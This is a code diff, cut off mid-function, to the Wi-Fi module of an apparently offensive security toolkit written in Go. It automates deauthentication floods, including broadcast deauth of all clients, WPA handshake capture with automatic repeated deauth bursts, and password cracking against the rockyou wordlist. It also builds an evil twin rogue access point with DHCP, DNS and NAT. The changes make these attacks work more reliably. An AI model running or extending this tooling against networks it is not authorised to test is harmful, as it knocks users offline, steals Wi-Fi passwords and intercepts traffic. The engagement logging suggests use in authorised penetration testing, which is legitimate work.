@@ -2,12 +2,14 @@ package wifi
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/csv"
 	"fmt"
 	"io"
 	"os"
 	"os/exec"
 	"runtime"
+	"sort"
 	"strconv"
 	"strings"
 	"time"
@@ -17,7 +19,7 @@ import (
 	"github.com/bryanparreira/davoid/internal/vault"
 )
 
-// Shared state between modules (populated by RunScan, consumed by Deauth/Handshake/EvilTwin).
+// Shared state populated by RunScan, consumed by Deauth/Handshake/EvilTwin.
 var (
 	lastScanNetworks []wifiNetwork
 	lastCapturePath  string
@@ -41,7 +43,7 @@ func RunMonitor() error {
 
 	ifaces := listAllInterfaces()
 	if len(ifaces) == 0 {
-		ui.Fail("No wireless interfaces found. Ensure a wireless adapter is connected.")
+		ui.Fail("No wireless interfaces found. Ensure wireless adapter is connected.")
 		return nil
 	}
 
@@ -71,9 +73,8 @@ func RunMonitor() error {
 	iface := ifaces[idx]
 
 	if action == 0 {
-		// Choose method: airmon-ng (classic) or iw (modern — better for dual-band/5GHz)
 		method := ui.Select("Monitor mode method", []string{
-			"iw  (modern — full dual-band 2.4GHz + 5GHz support)",
+			"iw  (modern — full dual-band 2.4GHz + 5GHz)",
 			"airmon-ng  (classic — requires aircrack-ng suite)",
 		})
 		if method < 0 {
@@ -81,9 +82,8 @@ func RunMonitor() error {
 		}
 
 		if method == 0 {
-			// Modern iw method — creates monitor interface that covers all bands the PHY supports
 			if _, err := exec.LookPath("iw"); err != nil {
-				ui.Fail("iw not found. Install: sudo apt install iw  OR choose airmon-ng method.")
+				ui.Fail("iw not found. Install: sudo apt install iw")
 				ui.PressEnter()
 				return nil
 			}
@@ -94,52 +94,46 @@ func RunMonitor() error {
 				return nil
 			}
 			monName := iface + "mon"
-			ui.Info(fmt.Sprintf("PHY: %s → creating monitor interface %s (covers 2.4GHz + 5GHz)...", phy, monName))
+			ui.Info(fmt.Sprintf("PHY: %s → creating %s (2.4GHz + 5GHz)...", phy, monName))
 
-			// Bring down managed interface so driver can switch mode
 			exec.Command("ip", "link", "set", iface, "down").Run()
+			exec.Command("iw", "dev", monName, "del").Run() // remove stale mon iface if exists
 
-			// Remove existing monitor interface with same name if present
-			exec.Command("iw", "dev", monName, "del").Run()
-
-			// Create monitor interface on the PHY (hardware) — not tied to a single band
-			createOut, createErr := exec.Command("iw", phy, "interface", "add", monName, "type", "monitor").CombinedOutput()
-			if createErr != nil {
-				ui.Fail(fmt.Sprintf("iw interface add failed: %v", createErr))
-				fmt.Println(strings.TrimSpace(string(createOut)))
-				ui.Info("Hint: may need sudo. Try: sudo iw " + phy + " interface add " + monName + " type monitor")
+			out, err := exec.Command("iw", phy, "interface", "add", monName, "type", "monitor").CombinedOutput()
+			if err != nil {
+				ui.Fail(fmt.Sprintf("iw interface add failed: %v", err))
+				fmt.Println(strings.TrimSpace(string(out)))
+				ui.Info("Hint: run as root. sudo iw " + phy + " interface add " + monName + " type monitor")
 				ui.PressEnter()
 				return nil
 			}
 
-			// Bring the monitor interface up
 			upOut, upErr := exec.Command("ip", "link", "set", monName, "up").CombinedOutput()
 			if upErr != nil {
-				ui.Fail(fmt.Sprintf("ip link set up failed: %v — %s", upErr, strings.TrimSpace(string(upOut))))
+				ui.Fail(fmt.Sprintf("ip link set %s up failed: %v — %s", monName, upErr, strings.TrimSpace(string(upOut))))
 				ui.PressEnter()
 				return nil
 			}
 
 			ui.Success(fmt.Sprintf("Monitor interface %s created via iw.", monName))
-			ui.Success("Full dual-band support: 2.4GHz channels 1-14 AND 5GHz channels 36-165.")
-			ui.Info("Use this interface in WiFi Scanner with band = Both (2.4+5GHz).")
-			ui.Info(fmt.Sprintf("Verify with: iw dev %s info", monName))
+			ui.Success("Full dual-band: 2.4GHz channels 1-14 AND 5GHz channels 36-165.")
+			ui.Info(fmt.Sprintf("Use %s in WiFi Scanner → band: Both 2.4+5GHz.", monName))
+			ui.Info(fmt.Sprintf("Verify: iw dev %s info", monName))
 			ui.PressEnter()
 			return nil
 		}
 
 		// airmon-ng method
 		if _, err := exec.LookPath("airmon-ng"); err != nil {
-			ui.Fail("airmon-ng not found. Install: sudo apt install aircrack-ng  OR choose iw method.")
+			ui.Fail("airmon-ng not found. Install: sudo apt install aircrack-ng  OR use iw method.")
 			ui.PressEnter()
 			return nil
 		}
-		if ui.Confirm("Kill interfering processes first? (Recommended — stops NetworkManager/wpa_supplicant)") {
+		if ui.Confirm("Kill interfering processes first? (Recommended)") {
 			ui.Info("Running airmon-ng check kill...")
 			killOut, _ := exec.Command("airmon-ng", "check", "kill").CombinedOutput()
 			for _, line := range strings.Split(string(killOut), "\n") {
-				line = strings.TrimSpace(line)
-				if line != "" {
+				if line = strings.TrimSpace(line); line != "" {
 					fmt.Println("  " + line)
 				}
 			}
@@ -147,8 +141,7 @@ func RunMonitor() error {
 		}
 		ifacesBefore := listAllInterfaces()
 		ui.Info(fmt.Sprintf("Starting monitor mode on %s...", iface))
-		cmd := exec.Command("airmon-ng", "start", iface)
-		out, err := cmd.CombinedOutput()
+		out, err := exec.Command("airmon-ng", "start", iface).CombinedOutput()
 		if err != nil {
 			ui.Fail(fmt.Sprintf("airmon-ng error: %v", err))
 			fmt.Println(string(out))
@@ -156,8 +149,7 @@ func RunMonitor() error {
 			return nil
 		}
 		for _, line := range strings.Split(string(out), "\n") {
-			line = strings.TrimSpace(line)
-			if strings.Contains(strings.ToLower(line), "monitor mode") {
+			if line = strings.TrimSpace(line); strings.Contains(strings.ToLower(line), "monitor mode") {
 				ui.Success(line)
 			}
 		}
@@ -178,10 +170,10 @@ func RunMonitor() error {
 		}
 		if len(newIfaces) > 0 {
 			ui.Success(fmt.Sprintf("Monitor interface(s) created: %s", strings.Join(newIfaces, ", ")))
-			ui.Info("Note: for full 5GHz scanning use iw method or pass --band abg in airodump-ng.")
+			ui.Info("Tip: for 5GHz coverage use iw method next time.")
 		} else {
-			ui.Info(fmt.Sprintf("Monitor mode started. Interface is typically %smon or mon0.", iface))
-			ui.Info("Run 'iw dev' to confirm the monitor interface name.")
+			ui.Info(fmt.Sprintf("Monitor mode started. Interface typically named %smon or mon0.", iface))
+			ui.Info("Verify: iw dev")
 		}
 		ui.PressEnter()
 		return nil
@@ -189,22 +181,19 @@ func RunMonitor() error {
 
 	// Stop monitor mode
 	if _, err := exec.LookPath("airmon-ng"); err == nil {
-		ui.Info(fmt.Sprintf("Stopping monitor mode on %s via airmon-ng...", iface))
+		ui.Info(fmt.Sprintf("Stopping %s via airmon-ng...", iface))
 		out, err := exec.Command("airmon-ng", "stop", iface).CombinedOutput()
 		if err != nil {
-			ui.Fail(fmt.Sprintf("airmon-ng error: %v", err))
-			fmt.Println(string(out))
+			ui.Fail(fmt.Sprintf("airmon-ng error: %v\n%s", err, string(out)))
 			ui.PressEnter()
 			return nil
 		}
 		for _, line := range strings.Split(string(out), "\n") {
-			line = strings.TrimSpace(line)
-			if strings.Contains(strings.ToLower(line), "monitor mode") {
+			if line = strings.TrimSpace(line); strings.Contains(strings.ToLower(line), "monitor mode") {
 				ui.Success(line)
 			}
 		}
 	} else {
-		// iw fallback: delete the monitor interface
 		ui.Info(fmt.Sprintf("Removing monitor interface %s via iw...", iface))
 		out, err := exec.Command("iw", "dev", iface, "del").CombinedOutput()
 		if err != nil {
@@ -213,7 +202,6 @@ func RunMonitor() error {
 			return nil
 		}
 	}
-
 	ui.Success(fmt.Sprintf("Monitor mode stopped on %s.", iface))
 	ui.PressEnter()
 	return nil
@@ -244,14 +232,14 @@ func RunScan() error {
 	monIface := ifaces[idx]
 
 	bandIdx := ui.Select("Band to scan", []string{
-		"Both 2.4GHz + 5GHz  (recommended — full coverage)",
+		"Both 2.4GHz + 5GHz  (recommended)",
 		"2.4GHz only  (channels 1-14)",
 		"5GHz only  (channels 36-165)",
 	})
 	if bandIdx < 0 {
 		return nil
 	}
-	bandFlag := "abg" // default: all bands
+	bandFlag := "abg"
 	switch bandIdx {
 	case 1:
 		bandFlag = "bg"
@@ -265,48 +253,27 @@ func RunScan() error {
 		dur = 20
 	}
 
-	tmpBase := fmt.Sprintf("/tmp/davoid_scan_%d", time.Now().Unix())
-	csvFile := tmpBase + "-01.csv"
-	defer os.Remove(csvFile)
-	defer os.Remove(tmpBase + "-01.kismet.csv")
-	defer os.Remove(tmpBase + "-01.kismet.netxml")
-
 	bandLabel := map[string]string{"abg": "2.4GHz + 5GHz", "bg": "2.4GHz", "a": "5GHz"}[bandFlag]
-	ui.Info(fmt.Sprintf("Scanning %s for %d seconds on %s...", bandLabel, dur, monIface))
-	fmt.Println()
+	networks, stderrOut := runAirodump(monIface, bandFlag, dur)
 
-	cmd := exec.Command("airodump-ng",
-		"--band", bandFlag,
-		"--output-format", "csv",
-		"--write", tmpBase,
-		"--write-interval", "2",
-		monIface,
-	)
-	cmd.Stdout = nil
-	cmd.Stderr = nil
-	if err := cmd.Start(); err != nil {
-		ui.Fail(fmt.Sprintf("airodump-ng failed to start: %v", err))
-		return nil
+	// If --band flag not supported by this airodump-ng version, retry without it
+	if len(networks) == 0 && (strings.Contains(stderrOut, "nknown") || strings.Contains(stderrOut, "nvalid") || strings.Contains(stderrOut, "option")) {
+		ui.Warn(fmt.Sprintf("--band %s not supported by this airodump-ng. Retrying 2.4GHz default scan...", bandFlag))
+		bandLabel = "2.4GHz (default)"
+		networks, stderrOut = runAirodump(monIface, "", dur)
 	}
 
-	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
-	deadline := time.Now().Add(time.Duration(dur) * time.Second)
-	ticker := time.NewTicker(100 * time.Millisecond)
-	i := 0
-	for time.Now().Before(deadline) {
-		<-ticker.C
-		fmt.Printf("\r  %s  Scanning %s... (%ds remaining)",
-			spin[i%len(spin)], monIface, int(time.Until(deadline).Seconds()))
-		i++
-	}
-	ticker.Stop()
-	fmt.Print("\r\033[K")
-	cmd.Process.Kill()
-	cmd.Wait()
-
-	networks, err := parseAirodumpCSV(csvFile)
-	if err != nil || len(networks) == 0 {
-		ui.Warn("No networks parsed. Ensure the interface is in monitor mode.")
+	if len(networks) == 0 {
+		ui.Warn("No networks found.")
+		if stderrOut != "" {
+			ui.Info("airodump-ng output:")
+			for _, line := range strings.Split(stderrOut, "\n") {
+				if line = strings.TrimSpace(line); line != "" && !strings.Contains(line, "\x1b[") {
+					fmt.Println("    " + line)
+				}
+			}
+		}
+		ui.Info("Check: interface is in monitor mode · correct interface selected · run as root")
 		ui.PressEnter()
 		return nil
 	}
@@ -315,25 +282,19 @@ func RunScan() error {
 
 	fmt.Println()
 	ui.Divider()
-	ui.Info(fmt.Sprintf("Found %d network(s):", len(networks)))
+	ui.Info(fmt.Sprintf("Found %d network(s) — band: %s", len(networks), bandLabel))
 	ui.Divider()
-	fmt.Printf("  %-18s  %-26s  %-4s  %-5s  %-14s  %s\n",
-		"BSSID", "ESSID", "CH", "PWR", "Encryption", "Clients")
-	fmt.Println("  " + strings.Repeat("─", 80))
+	fmt.Printf("  %-18s  %-26s  %-4s  %-6s  %-14s  %s\n",
+		"BSSID", "ESSID", "CH", "SIGNAL", "Encryption", "Clients")
+	fmt.Println("  " + strings.Repeat("─", 84))
 
 	for _, n := range networks {
 		enc := n.Encryption
 		if enc == "" {
 			enc = "OPN"
 		}
-		fmt.Printf("  %-18s  %-26s  %-4s  %-5s  %-14s  %d\n",
-			n.BSSID,
-			wTrunc(n.ESSID, 24),
-			n.Channel,
-			n.Signal,
-			enc,
-			len(n.Clients),
-		)
+		fmt.Printf("  %-18s  %-26s  %-4s  %-6s  %-14s  %d\n",
+			n.BSSID, wTrunc(n.ESSID, 24), n.Channel, n.Signal, enc, len(n.Clients))
 	}
 
 	eng, _ := engagement.Active()
@@ -353,6 +314,67 @@ func RunScan() error {
 	return nil
 }
 
+// runAirodump runs airodump-ng and returns parsed networks + raw stderr.
+// bandFlag empty = no --band argument (default 2.4GHz).
+func runAirodump(monIface, bandFlag string, dur int) ([]wifiNetwork, string) {
+	tmpBase := fmt.Sprintf("/tmp/davoid_scan_%d", time.Now().Unix())
+	csvFile := tmpBase + "-01.csv"
+	defer os.Remove(csvFile)
+	defer os.Remove(tmpBase + "-01.kismet.csv")
+	defer os.Remove(tmpBase + "-01.kismet.netxml")
+	defer os.Remove(tmpBase + "-01.log.csv")
+
+	args := []string{}
+	if bandFlag != "" {
+		args = append(args, "--band", bandFlag)
+	}
+	args = append(args, "--output-format", "csv", "--write", tmpBase, "--write-interval", "2", monIface)
+
+	var stderrBuf bytes.Buffer
+	cmd := exec.Command("airodump-ng", args...)
+	cmd.Stdout = nil
+	cmd.Stderr = &stderrBuf
+
+	if err := cmd.Start(); err != nil {
+		return nil, fmt.Sprintf("failed to start: %v", err)
+	}
+
+	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
+	deadline := time.Now().Add(time.Duration(dur) * time.Second)
+	ticker := time.NewTicker(100 * time.Millisecond)
+	i := 0
+	for time.Now().Before(deadline) {
+		<-ticker.C
+		fmt.Printf("\r  %s  Scanning %s... (%ds remaining)",
+			spin[i%len(spin)], monIface, int(time.Until(deadline).Seconds()))
+		i++
+	}
+	ticker.Stop()
+	fmt.Print("\r\033[K")
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+	}
+	cmd.Wait()
+
+	// Give OS time to flush the CSV file after process kill
+	time.Sleep(200 * time.Millisecond)
+
+	networks, err := parseAirodumpCSV(csvFile)
+	if err != nil {
+		return nil, stderrBuf.String()
+	}
+
+	// Sort by signal strength (higher = stronger, less negative)
+	sort.Slice(networks, func(i, j int) bool {
+		si, _ := strconv.Atoi(networks[i].Signal)
+		sj, _ := strconv.Atoi(networks[j].Signal)
+		return si > sj
+	})
+
+	return networks, stderrBuf.String()
+}
+
 // =============================================================================
 // 3. Deauth Attack (aireplay-ng)
 // =============================================================================
@@ -370,12 +392,35 @@ func RunDeauth() error {
 		return nil
 	}
 
+	// Injection capability test
+	if ui.Confirm("Run injection test first? (Recommended — verifies driver supports packet injection)") {
+		ui.Info(fmt.Sprintf("Testing injection on %s...", monIface))
+		testOut, _ := exec.Command("aireplay-ng", "--test", monIface).CombinedOutput()
+		for _, line := range strings.Split(string(testOut), "\n") {
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
+			if strings.Contains(strings.ToLower(line), "injection is working") || strings.Contains(line, "30/30") {
+				ui.Success(line)
+			} else if strings.Contains(strings.ToLower(line), "no answer") || strings.Contains(strings.ToLower(line), "failed") {
+				ui.Warn(line)
+			} else {
+				fmt.Println("  " + line)
+			}
+		}
+		fmt.Println()
+		if !ui.Confirm("Continue with deauth?") {
+			return nil
+		}
+	}
+
 	bssid, essid, channel := "", "", ""
 
 	if len(lastScanNetworks) > 0 {
 		opts := []string{"Enter manually"}
 		for _, n := range lastScanNetworks {
-			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%s  %s",
+			opts = append(opts, fmt.Sprintf("%-24s  [%s]  ch%-3s  %s",
 				wTrunc(n.ESSID, 22), n.BSSID, n.Channel, n.Encryption))
 		}
 		idx := ui.Select("Target network", opts)
@@ -394,14 +439,15 @@ func RunDeauth() error {
 		channel = ui.PromptDefault("Channel", "6")
 	}
 
+	// Set interface to target channel
 	if channel != "" {
-		// Prefer iw (modern) for channel setting; iwconfig fallback for older kernels
 		if err := exec.Command("iw", "dev", monIface, "set", "channel", channel).Run(); err != nil {
 			exec.Command("iwconfig", monIface, "channel", channel).Run()
 		}
+		ui.Info(fmt.Sprintf("Interface %s tuned to channel %s.", monIface, channel))
 	}
 
-	clientMAC := ui.PromptDefault("Client MAC (blank = broadcast deauth all clients)", "")
+	clientMAC := ui.PromptDefault("Client MAC (blank = broadcast — deauth ALL clients)", "")
 	countStr := ui.PromptDefault("Packet count (0 = continuous)", "0")
 	if countStr == "" {
 		countStr = "0"
@@ -413,10 +459,7 @@ func RunDeauth() error {
 	}
 
 	fmt.Println()
-	ui.Info(fmt.Sprintf("Deauthing %s via %s", target, monIface))
-	if channel != "" {
-		ui.Info(fmt.Sprintf("Channel: %s", channel))
-	}
+	ui.Info(fmt.Sprintf("Deauthing %s via %s  ch%s", target, monIface, channel))
 	ui.Warn("Press Ctrl+C to stop.")
 	ui.Divider()
 
@@ -487,11 +530,15 @@ func RunHandshake() error {
 	outBase := fmt.Sprintf("/tmp/davoid_hs_%s_%d", sanitize(essid), time.Now().Unix())
 	lastCapturePath = outBase + "-01.cap"
 
+	autoDeauth := ui.Confirm("Auto-deauth target to force client reconnect? (Triggers handshake faster)")
+
 	fmt.Println()
-	ui.Info(fmt.Sprintf("Capturing handshake from %s on channel %s...", bssid, channel))
-	ui.Info(fmt.Sprintf("Capture: %s", lastCapturePath))
-	ui.Warn("Open another terminal and run Deauth against this AP to force a reconnect.")
-	ui.Warn("Press Ctrl+C when handshake is captured.")
+	ui.Info(fmt.Sprintf("Capturing from %s on channel %s...", bssid, channel))
+	ui.Info(fmt.Sprintf("Capture file: %s", lastCapturePath))
+	if !autoDeauth {
+		ui.Warn("In another terminal: run Deauth against this AP to force reconnect.")
+	}
+	ui.Warn("Press Ctrl+C to stop capture.")
 	ui.Divider()
 
 	cmd := exec.Command("airodump-ng",
@@ -502,52 +549,114 @@ func RunHandshake() error {
 		monIface,
 	)
 
+	// Capture both stdout and stderr — different airodump-ng builds write
+	// "WPA handshake" to different streams
+	var combinedBuf bytes.Buffer
+	outPipe, _ := cmd.StdoutPipe()
 	errPipe, _ := cmd.StderrPipe()
+
 	if err := cmd.Start(); err != nil {
 		ui.Fail(fmt.Sprintf("airodump-ng failed: %v", err))
 		return nil
 	}
 
 	handshakeCh := make(chan bool, 1)
-	go func() {
-		scanner := bufio.NewScanner(errPipe)
+	scanStream := func(r io.Reader) {
+		scanner := bufio.NewScanner(r)
 		for scanner.Scan() {
-			if strings.Contains(scanner.Text(), "WPA handshake") {
-				handshakeCh <- true
+			line := scanner.Text()
+			combinedBuf.WriteString(line + "\n")
+			if strings.Contains(line, "WPA handshake") {
+				select {
+				case handshakeCh <- true:
+				default:
+				}
 				return
 			}
 		}
-		handshakeCh <- false
-	}()
+	}
+	go scanStream(outPipe)
+	go scanStream(errPipe)
+
+	// Auto-deauth in background to force handshake
+	var deauthCmd *exec.Cmd
+	if autoDeauth {
+		if _, err := exec.LookPath("aireplay-ng"); err == nil {
+			time.Sleep(2 * time.Second) // let airodump settle first
+			deauthArgs := []string{"--deauth", "5", "-a", bssid, monIface}
+			deauthCmd = exec.Command("aireplay-ng", deauthArgs...)
+			deauthCmd.Stdout = nil
+			deauthCmd.Stderr = nil
+			deauthCmd.Start()
+			ui.Info("Auto-deauth started (5 packets)...")
+		}
+	}
 
 	spin := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
-	ticker := time.NewTicker(100 * time.Millisecond)
+	capCheckTicker := time.NewTicker(5 * time.Second)
+	spinTicker := time.NewTicker(100 * time.Millisecond)
 	j := 0
+	captureConfirmed := false
+
+outer:
 	for {
 		select {
 		case got := <-handshakeCh:
-			ticker.Stop()
-			fmt.Print("\r\033[K")
 			if got {
-				ui.Success(fmt.Sprintf("WPA handshake captured! → %s", lastCapturePath))
-			} else {
-				ui.Info(fmt.Sprintf("Capture stopped. File saved to %s", lastCapturePath))
+				captureConfirmed = true
 			}
-			goto done
-		case <-ticker.C:
+			break outer
+
+		case <-capCheckTicker.C:
+			// Verify cap file via aircrack-ng — reliable regardless of airodump stderr behaviour
+			if _, err := os.Stat(lastCapturePath); err == nil {
+				if _, err2 := exec.LookPath("aircrack-ng"); err2 == nil {
+					out, _ := exec.Command("aircrack-ng", lastCapturePath).Output()
+					outStr := string(out)
+					if strings.Contains(outStr, "handshake") || strings.Contains(outStr, "1 potential") {
+						captureConfirmed = true
+						break outer
+					}
+				}
+			}
+			// Re-send deauth burst every 10s if auto-deauth is on
+			if autoDeauth && deauthCmd != nil && j > 100 {
+				newDeauth := exec.Command("aireplay-ng", "--deauth", "5", "-a", bssid, monIface)
+				newDeauth.Stdout = nil
+				newDeauth.Stderr = nil
+				newDeauth.Start()
+			}
+
+		case <-spinTicker.C:
 			fmt.Printf("\r  %s  Waiting for WPA handshake from %s...", spin[j%len(spin)], bssid)
 			j++
 		}
 	}
-done:
-	cmd.Process.Kill()
+
+	capCheckTicker.Stop()
+	spinTicker.Stop()
+	fmt.Print("\r\033[K")
+
+	if cmd.Process != nil {
+		cmd.Process.Kill()
+	}
 	cmd.Wait()
+	if deauthCmd != nil && deauthCmd.Process != nil {
+		deauthCmd.Process.Kill()
+	}
+
+	if captureConfirmed {
+		ui.Success(fmt.Sprintf("WPA handshake captured! → %s", lastCapturePath))
+	} else {
+		ui.Info(fmt.Sprintf("Capture stopped. File: %s", lastCapturePath))
+		ui.Info("Verify: aircrack-ng " + lastCapturePath)
+	}
 
 	eng, _ := engagement.Active()
 	if eng != nil {
 		engagement.LogFinding(eng.ID, "wifi_handshake", bssid,
-			fmt.Sprintf("WPA handshake capture attempt — %s", essid),
-			fmt.Sprintf("BSSID: %s  File: %s", bssid, lastCapturePath),
+			fmt.Sprintf("WPA handshake capture — %s", essid),
+			fmt.Sprintf("BSSID: %s  File: %s  Confirmed: %v", bssid, lastCapturePath, captureConfirmed),
 			"HIGH", "")
 	}
 
@@ -584,7 +693,32 @@ func RunCrack() error {
 		}
 	}
 
+	// Resolve wordlist — rockyou.txt may be gzipped on fresh Kali
 	wordlist := ui.PromptDefault("Wordlist path", "/usr/share/wordlists/rockyou.txt")
+	if _, err := os.Stat(wordlist); err != nil {
+		gzPath := wordlist + ".gz"
+		if _, err2 := os.Stat(gzPath); err2 == nil {
+			ui.Warn(fmt.Sprintf("Wordlist not found at %s — found gzipped version.", wordlist))
+			if ui.Confirm(fmt.Sprintf("Decompress %s now? (~140MB, takes ~30s)", gzPath)) {
+				ui.Info("Decompressing rockyou.txt.gz...")
+				out, err3 := exec.Command("gunzip", "-k", gzPath).CombinedOutput()
+				if err3 != nil {
+					ui.Fail(fmt.Sprintf("gunzip failed: %v — %s", err3, strings.TrimSpace(string(out))))
+					ui.PressEnter()
+					return nil
+				}
+				ui.Success("Decompressed: " + wordlist)
+			} else {
+				wordlist = ui.Prompt("Enter wordlist path")
+				if wordlist == "" {
+					return nil
+				}
+			}
+		} else {
+			ui.Warn(fmt.Sprintf("Wordlist not found at %s — proceeding anyway.", wordlist))
+		}
+	}
+
 	bssid := ui.PromptDefault("Target BSSID (blank = try all in file)", "")
 
 	fmt.Println()
@@ -604,7 +738,7 @@ func RunCrack() error {
 	cmd.Run()
 
 	fmt.Println()
-	if ui.Confirm("Was a password cracked? Save it to vault?") {
+	if ui.Confirm("Was a password cracked? Save to vault?") {
 		pass := ui.Prompt("Cracked password")
 		essid := ui.PromptDefault("Network name (ESSID)", bssid)
 		eng, _ := engagement.Active()
@@ -630,7 +764,7 @@ func RunEvilTwin() error {
 	ui.Header("Evil Twin — Rogue Access Point (hostapd + dnsmasq)")
 
 	missing := []string{}
-	for _, tool := range []string{"hostapd", "dnsmasq"} {
+	for _, tool := range []string{"hostapd", "dnsmasq", "iptables"} {
 		if _, err := exec.LookPath(tool); err != nil {
 			missing = append(missing, tool)
 		}
@@ -647,11 +781,14 @@ func RunEvilTwin() error {
 		return nil
 	}
 
-	idx := ui.Select("AP interface (use a non-monitor wlan interface)", ifaces)
+	idx := ui.Select("AP interface (managed mode — NOT the monitor interface)", ifaces)
 	if idx < 0 {
 		return nil
 	}
 	apIface := ifaces[idx]
+
+	// Internet-connected interface for NAT (gives clients real internet access)
+	outIface := ui.PromptDefault("Internet-connected interface (for NAT/routing)", "eth0")
 
 	ssid := ""
 	if len(lastScanNetworks) > 0 && ui.Confirm("Clone SSID from last scan?") {
@@ -671,26 +808,34 @@ func RunEvilTwin() error {
 		}
 	}
 
-	channel := ui.PromptDefault("Channel", "6")
+	channel := ui.PromptDefault("Channel (1-13 for 2.4GHz, 36+ for 5GHz)", "6")
+	chanNum, _ := strconv.Atoi(channel)
 	apIP := ui.PromptDefault("Gateway IP for clients", "192.168.99.1")
-
 	subnet := apIP[:strings.LastIndex(apIP, ".")+1]
+
+	// hw_mode: g = 2.4GHz, a = 5GHz
+	hwMode := "g"
+	if chanNum >= 36 {
+		hwMode = "a"
+	}
 
 	hostapdConf := fmt.Sprintf(`interface=%s
 driver=nl80211
 ssid=%s
-hw_mode=g
+hw_mode=%s
 channel=%s
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-`, apIface, ssid, channel)
+`, apIface, ssid, hwMode, channel)
 
 	dnsmasqConf := fmt.Sprintf(`interface=%s
+bind-interfaces
 dhcp-range=%s50,%s150,12h
 dhcp-option=3,%s
 dhcp-option=6,%s
 server=8.8.8.8
+no-resolv
 `, apIface, subnet, subnet, apIP, apIP)
 
 	hostapdPath := "/tmp/davoid_hostapd.conf"
@@ -707,8 +852,47 @@ server=8.8.8.8
 		return nil
 	}
 
-	// Configure interface IP
-	exec.Command("ifconfig", apIface, apIP, "netmask", "255.255.255.0").Run()
+	// Stop services that conflict on port 53 (systemd-resolved / system dnsmasq)
+	ui.Info("Stopping conflicting DNS services...")
+	exec.Command("systemctl", "stop", "systemd-resolved").Run()
+	exec.Command("systemctl", "stop", "dnsmasq").Run()
+	exec.Command("pkill", "-9", "dnsmasq").Run()
+	time.Sleep(300 * time.Millisecond)
+
+	// Assign AP IP to interface using ip (ifconfig deprecated)
+	ui.Info(fmt.Sprintf("Configuring %s with IP %s...", apIface, apIP))
+	exec.Command("ip", "link", "set", apIface, "up").Run()
+	exec.Command("ip", "addr", "flush", "dev", apIface).Run()
+	if out, err := exec.Command("ip", "addr", "add", apIP+"/24", "dev", apIface).CombinedOutput(); err != nil {
+		ui.Fail(fmt.Sprintf("ip addr add failed: %v — %s", err, strings.TrimSpace(string(out))))
+		return nil
+	}
+
+	// Enable IP forwarding
+	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644); err != nil {
+		ui.Warn(fmt.Sprintf("Could not enable IP forwarding: %v", err))
+	}
+
+	// NAT — masquerade AP traffic out of internet interface
+	natAdded := false
+	natArgs := []string{"-t", "nat", "-A", "POSTROUTING", "-o", outIface, "-j", "MASQUERADE"}
+	if out, err := exec.Command("iptables", natArgs...).CombinedOutput(); err != nil {
+		ui.Warn(fmt.Sprintf("iptables NAT failed: %v — %s", err, strings.TrimSpace(string(out))))
+		ui.Warn("Clients will connect but may not have internet access.")
+	} else {
+		natAdded = true
+		ui.Success(fmt.Sprintf("NAT configured: %s → %s", apIface, outIface))
+	}
+	// Clean up NAT rule on exit
+	if natAdded {
+		defer exec.Command("iptables", "-t", "nat", "-D", "POSTROUTING", "-o", outIface, "-j", "MASQUERADE").Run()
+	}
+
+	// Allow forwarding between AP iface and internet iface
+	exec.Command("iptables", "-A", "FORWARD", "-i", apIface, "-o", outIface, "-j", "ACCEPT").Run()
+	exec.Command("iptables", "-A", "FORWARD", "-i", outIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT").Run()
+	defer exec.Command("iptables", "-D", "FORWARD", "-i", apIface, "-o", outIface, "-j", "ACCEPT").Run()
+	defer exec.Command("iptables", "-D", "FORWARD", "-i", outIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT").Run()
 
 	hostapdCmd := exec.Command("hostapd", hostapdPath)
 	dnsmasqCmd := exec.Command("dnsmasq", "-C", dnsmasqPath, "--no-daemon")
@@ -718,25 +902,38 @@ server=8.8.8.8
 	dnsmasqCmd.Stderr = os.Stderr
 
 	if err := hostapdCmd.Start(); err != nil {
-		ui.Fail(fmt.Sprintf("hostapd failed: %v", err))
+		ui.Fail(fmt.Sprintf("hostapd failed to start: %v", err))
 		return nil
 	}
 	if err := dnsmasqCmd.Start(); err != nil {
 		hostapdCmd.Process.Kill()
-		ui.Fail(fmt.Sprintf("dnsmasq failed: %v", err))
+		ui.Fail(fmt.Sprintf("dnsmasq failed to start: %v", err))
 		return nil
 	}
+	defer func() {
+		if hostapdCmd.Process != nil {
+			hostapdCmd.Process.Kill()
+		}
+		if dnsmasqCmd.Process != nil {
+			dnsmasqCmd.Process.Kill()
+		}
+		// Restore IP forwarding to original state
+		os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0"), 0644)
+	}()
 
 	fmt.Println()
-	ui.Success(fmt.Sprintf("Evil twin '%s' live on %s (ch %s)", ssid, apIface, channel))
-	ui.Info(fmt.Sprintf("DHCP range: %s50 – %s150", subnet, subnet))
+	ui.Success(fmt.Sprintf("Evil twin '%s' live on %s (ch %s  hw_mode=%s)", ssid, apIface, channel, hwMode))
+	ui.Info(fmt.Sprintf("DHCP range: %s50 – %s150  Gateway: %s", subnet, subnet, apIP))
+	if natAdded {
+		ui.Success(fmt.Sprintf("NAT active — clients route via %s", outIface))
+	}
 	ui.Warn("Press Ctrl+C to shut down the AP.")
 
 	eng, _ := engagement.Active()
 	if eng != nil {
 		engagement.LogFinding(eng.ID, "wifi_eviltwin", ssid,
 			fmt.Sprintf("Evil twin AP deployed: %s", ssid),
-			fmt.Sprintf("Interface: %s  Channel: %s  Gateway: %s", apIface, channel, apIP),
+			fmt.Sprintf("Interface: %s  Channel: %s  Gateway: %s  NAT: %v", apIface, channel, apIP, natAdded),
 			"CRITICAL", "")
 	}
 
@@ -760,8 +957,7 @@ func listAllInterfaces() []string {
 		if err == nil {
 			var ifaces []string
 			for _, line := range strings.Split(string(out), "\n") {
-				line = strings.TrimSpace(line)
-				if strings.HasPrefix(line, "Interface ") {
